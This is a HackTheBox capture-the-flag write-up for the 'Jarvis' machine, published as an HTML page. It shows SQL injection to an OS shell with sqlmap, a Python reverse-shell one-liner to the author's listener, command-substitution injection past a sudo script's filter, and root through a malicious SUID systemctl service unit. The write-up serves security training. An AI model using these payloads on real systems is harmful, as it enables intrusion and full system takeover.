@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/jarvis.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Jarvis - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-medium">medium</span>
+                    <span class="article-cat">· web / linux</span>
+                </div>
+
+                <h1>Jarvis</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Jarvis</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">sql injection to os-shell</span>
+                    <span class="tag">sudo script command injection</span>
+                    <span class="tag">command substitution bypass</span>
+                    <span class="tag">suid systemctl lpe</span>
+                </div>
+
+                <img src="../../images/hackthebox/jarvis/index.png" alt="Jarvis Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH, Apache on 80, and a second Apache instance on 64999. The web server resolves to <code>supersecurehotel.htb</code>, which I added to <code>/etc/hosts</code>.</p>
+
+                <pre><code>[jarvis] nmap -Pn --min-rate 2000 -T5 -p- -v -sSVC -oN nmap 10.129.229.137
+Nmap scan report for supersecurehotel.htb (10.129.229.137)
+Host is up (0.23s latency).
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The site on 80 is a hotel booking front end, "Stark Hotel". The room pages take a numeric parameter, <code>/room.php?cod=1</code>, which is the obvious injection candidate.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>The <code>cod</code> parameter is injectable. Pointing <code>sqlmap</code> at it confirms the injection, and since the DB user can write files, I go straight for <code>--os-shell</code>, which drops a PHP shell in the web root and hands back command execution as <code>www-data</code>:</p>
+
+                <pre><code>[jarvis] sqlmap -u 'http://supersecurehotel.htb/room.php?cod=1' --batch --os-shell</code></pre>
+
+                <p>From that limited shell I fire a proper reverse shell back to my listener:</p>
+
+                <pre><code>os-shell> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'</code></pre>
+
+                <pre><code>[jarvis] nc -lvnp 4444
+www-data@jarvis:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Enumerating sudo rights, <code>www-data</code> can run an admin helper as the user <code>pepper</code>: <code>/var/www/Admin-Utilities/simpler.py</code>. The script has a ping feature that blacklists a handful of characters before passing the input to a shell, but it never blocks command substitution. Wrapping my commands in <code>$(...)</code> sails past the filter and runs as <code>pepper</code>. I use it to make a SUID copy of <code>bash</code>:</p>
+
+                <pre><code>localhost$(cp /bin/bash /tmp/bash)
+localhost$(chmod u+s /tmp/bash)</code></pre>
+
+                <p>Running that copy with <code>-p</code> keeps the effective UID as <code>pepper</code>. From there I fix the real UID with <code>setreuid</code>, which still leaves the group as <code>www-data</code>, so I run <code>newgrp pepper</code> to pick up the <code>pepper</code> group as well. That last part matters: the root SUID used for the next step is only group-executable by <code>pepper</code>. Now I have a full <code>pepper</code> session and the user flag:</p>
+
+                <pre><code>www-data@jarvis:/tmp$ /tmp/bash -p
+bash-4.4$ id
+uid=33(www-data) gid=33(www-data) euid=1000(pepper) groups=33(www-data)
+bash-4.4$ python3 -c 'import os; os.setreuid(1000,1000); os.execv("/bin/bash", ["bash"])'
+pepper@jarvis:/tmp$ id
+uid=1000(pepper) gid=33(www-data) groups=33(www-data)
+pepper@jarvis:~$ newgrp pepper
+pepper@jarvis:~$ id
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper),33(www-data)
+pepper@jarvis:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>As <code>pepper</code>, <code>systemctl</code> is a root-owned SUID binary that the <code>pepper</code> group can execute:</p>
+
+                <pre><code>pepper@jarvis:~$ ls -la /bin/systemctl
+-rwsr-x--- 1 root pepper 171K Jun 29  2022 /bin/systemctl</code></pre>
+
+                <p>A SUID <code>systemctl</code> means we can install and start our own unit, and anything in its <code>ExecStart</code> runs as root. I wrote a one-shot service that sets the SUID bit on <code>bash</code>, then enabled and started it:</p>
+
+                <pre><code>pepper@jarvis:~$ cat /dev/shm/malicious.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target
+
+pepper@jarvis:~$ /bin/systemctl enable --now /dev/shm/malicious.service</code></pre>
+
+                <p>With <code>bash</code> now SUID root, <code>-p</code> drops straight into a root shell to read the flag:</p>
+
+                <pre><code>pepper@jarvis:~$ /bin/bash -p
+bash-4.4# id
+uid=1000(pepper) gid=1000(pepper) euid=0(root) groups=1000(pepper),33(www-data)
+bash-4.4# cat /root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Jarvis</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
